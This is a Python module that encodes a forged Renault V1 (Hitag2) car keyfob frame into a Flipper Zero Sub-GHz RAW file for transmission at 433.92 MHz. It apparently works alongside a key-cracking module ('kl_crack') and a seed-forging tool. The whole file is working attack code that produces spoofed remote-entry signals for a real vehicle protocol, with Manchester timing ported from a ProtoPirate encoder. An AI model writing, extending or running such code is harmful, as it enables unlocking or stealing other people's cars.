"""Render a forged Renault V1 (Hitag2) frame as a Flipper RAW .sub for transmit. Structure + timing
ported verbatim from the firmware encoder (ProtoPirate renault_v1.c): Manchester at TE=125us
(bit1 = high,low / bit0 = low,high), 250-pair preamble, 3 long frames [1500us low, 1000us high,
16-bit '1' header, 64-bit key, 24-bit key_2] then 3 short frames [..., 10-bit short_key, 21500us gap].
The 11-byte frame from the native seed-forge maps to key = bytes[0:8] (BE u64), key_2 = bytes[8:11]."""
import json

_TE = 125
_HDR_LOW = 1500
_HDR_HIGH = 1000
_SHORT_GAP = 21500
_PRE_PAIRS = 250
_LONG = 3
_SHORT = 3
_HDR_BITS = 16
_KEY_BITS = 64
_KEY2_BITS = 24
_SKEY_BITS = 10
_DEFAULT_PRESET = "FuriHalSubGhzPreset2FSKDev476Async"


def _bits(p, value, nbits):
    for i in range(nbits - 1, -1, -1):
        if (value >> i) & 1:
            p += [_TE, -_TE]   # bit 1 = high, low
        else:
            p += [-_TE, _TE]   # bit 0 = low, high


def _coalesce(p):
    out = []
    for d in p:
        if d == 0:
            continue
        if out and ((out[-1] > 0) == (d > 0)):
            out[-1] += d
        else:
            out.append(d)
    return out


def _frame_levels(key, key2, short_key):
    p = []
    for _ in range(_PRE_PAIRS):
        p += [_TE, -_TE]
    for _ in range(_LONG):
        p += [-_HDR_LOW, _HDR_HIGH]
        _bits(p, 1, _HDR_BITS)
        _bits(p, key, _KEY_BITS)
        _bits(p, key2, _KEY2_BITS)
    for _ in range(_SHORT):
        p += [-_HDR_LOW, _HDR_HIGH]
        _bits(p, 1, _HDR_BITS)
        _bits(p, short_key, _SKEY_BITS)
        p += [-_SHORT_GAP]
    return p


def render_sub(frame_hex, freq=433920000, preset=_DEFAULT_PRESET):
    h = frame_hex.replace(" ", "").replace("0x", "").replace("0X", "")
    try:
        b = bytes.fromhex(h)
    except ValueError:
        return json.dumps({"ok": False, "error": "bad hex frame"})
    if len(b) < 11:
        b = b + bytes(11 - len(b))
    key = int.from_bytes(b[0:8], "big")
    key2 = int.from_bytes(b[8:11], "big") & 0xFFFFFF
    short_key = (key >> 18) & 0x3FF
    p = _coalesce(_frame_levels(key, key2, short_key))
    lines = ["RAW_Data: " + " ".join(str(x) for x in p[i:i + 512]) for i in range(0, len(p), 512)]
    sub = ("Filetype: Flipper SubGhz RAW File\nVersion: 1\nFrequency: %d\nPreset: %s\nProtocol: RAW\n%s\n"
           % (freq, preset, "\n".join(lines)))
    return json.dumps({"ok": True, "sub": sub, "key": "%016X" % key, "key2": "%06X" % key2})


# ---- self-test: Manchester-decode the long-frame data back to key||key_2 ----
def _selftest():
    import kl_crack  # noqa (ensures the python path is sane); not actually required
    key = 0x1122334455667788
    key2 = 0xABCDEF
    short_key = (key >> 18) & 0x3FF
    lev = _frame_levels(key, key2, short_key)
    # find the first long frame's data: skip 250 preamble pairs (500 entries) + header low/high (2)
    idx = _PRE_PAIRS * 2 + 2
    # header is 16 bits (32 entries), then 64 key bits, then 24 key2 bits — read pairs
    def read(nbits, start):
        v = 0
        for k in range(nbits):
            hi, lo = lev[start + k * 2], lev[start + k * 2 + 1]
            bit = 1 if (hi > 0 and lo < 0) else 0
            v = (v << 1) | bit
        return v, start + nbits * 2
    hdr, idx = read(_HDR_BITS, idx)
    kv, idx = read(_KEY_BITS, idx)
    k2, idx = read(_KEY2_BITS, idx)
    return hdr == 1 and kv == key and k2 == key2
